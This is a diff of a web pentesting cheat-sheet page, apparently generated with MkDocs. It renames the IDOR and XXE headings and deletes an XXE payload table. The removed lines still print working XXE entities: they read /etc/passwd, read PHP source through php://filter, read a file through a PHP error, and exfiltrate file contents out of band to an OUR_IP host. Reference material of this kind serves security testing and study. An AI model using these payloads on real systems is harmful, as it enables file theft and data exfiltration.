@@ -769,13 +769,13 @@
 </li>
       
         <li class="md-nav__item">
-  <a href="#idor" class="md-nav__link">
+  <a href="#insecure-direct-object-referencing-idor" class="md-nav__link">
     <span class="md-ellipsis">
-      IDOR
+      Insecure Direct Object Referencing (IDOR)
     </span>
   </a>
   
-    <nav class="md-nav" aria-label="IDOR">
+    <nav class="md-nav" aria-label="Insecure Direct Object Referencing (IDOR)">
       <ul class="md-nav__list">
         
           <li class="md-nav__item">
@@ -820,9 +820,9 @@
 </li>
       
         <li class="md-nav__item">
-  <a href="#xxe" class="md-nav__link">
+  <a href="#xml-external-entity-xxe-injection" class="md-nav__link">
     <span class="md-ellipsis">
-      XXE
+      XML External Entity (XXE) Injection
     </span>
   </a>
   
@@ -1266,13 +1266,13 @@
 </li>
       
         <li class="md-nav__item">
-  <a href="#idor" class="md-nav__link">
+  <a href="#insecure-direct-object-referencing-idor" class="md-nav__link">
     <span class="md-ellipsis">
-      IDOR
+      Insecure Direct Object Referencing (IDOR)
     </span>
   </a>
   
-    <nav class="md-nav" aria-label="IDOR">
+    <nav class="md-nav" aria-label="Insecure Direct Object Referencing (IDOR)">
       <ul class="md-nav__list">
         
           <li class="md-nav__item">
@@ -1317,9 +1317,9 @@
 </li>
       
         <li class="md-nav__item">
-  <a href="#xxe" class="md-nav__link">
+  <a href="#xml-external-entity-xxe-injection" class="md-nav__link">
     <span class="md-ellipsis">
-      XXE
+      XML External Entity (XXE) Injection
     </span>
   </a>
   
@@ -1407,7 +1407,7 @@
 <li>Trial and error change Verb in intercepted requests in burp.</li>
 <li><code class="language-bash highlight">curl<span class="w"> </span>-i<span class="w"> </span>-X<span class="w"> </span>OPTIONS<span class="w"> </span>http://SERVER_IP:PORT/</code> to see what verbs are accepted.</li>
 </ul>
-<h2 id="idor"><a href="https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/05-Authorization_Testing/04-Testing_for_Insecure_Direct_Object_References">IDOR</a></h2>
+<h2 id="insecure-direct-object-referencing-idor"><a href="https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/05-Authorization_Testing/04-Testing_for_Insecure_Direct_Object_References">Insecure Direct Object Referencing (IDOR)</a></h2>
 <h3 id="identify-idors">Identify IDORs</h3>
 <ul>
 <li>In URL parameters &amp; APIs (<code>?uid=1</code> or <code>?filename=file_1.pdf</code>)</li>
@@ -1568,37 +1568,7 @@ and pass the value to mass download files:
 </tr>
 </tbody>
 </table>
-<h2 id="xxe"><a href="https://owasp.org/www-community/vulnerabilities/XML_External_Entity_(XXE)_Processing">XXE</a></h2>
-<table>
-<thead>
-<tr>
-<th>Code</th>
-<th>Description</th>
-</tr>
-</thead>
-<tbody>
-<tr>
-<td><code>&lt;!ENTITY xxe SYSTEM "http://localhost/email.dtd"&gt;</code></td>
-<td>Define External Entity to a URL</td>
-</tr>
-<tr>
-<td><code>&lt;!ENTITY xxe SYSTEM "file:///etc/passwd"&gt;</code></td>
-<td>Define External Entity to a file path</td>
-</tr>
-<tr>
-<td><code>&lt;!ENTITY company SYSTEM "php://filter/convert.base64-encode/resource=index.php"&gt;</code></td>
-<td>Read PHP source code with base64 encode filter</td>
-</tr>
-<tr>
-<td><code>&lt;!ENTITY % error "&lt;!ENTITY content SYSTEM '%nonExistingEntity;/%file;'&gt;"&gt;</code></td>
-<td>Reading a file through a PHP error</td>
-</tr>
-<tr>
-<td><code>&lt;!ENTITY % oob "&lt;!ENTITY content SYSTEM 'http://OUR_IP:8000/?content=%file;'&gt;"&gt;</code></td>
-<td>Reading a file OOB exfiltration</td>
-</tr>
-</tbody>
-</table>
+<h2 id="xml-external-entity-xxe-injection"><a href="https://owasp.org/www-community/vulnerabilities/XML_External_Entity_(XXE)_Processing">XML External Entity (XXE) Injection</a></h2>
 
 
 
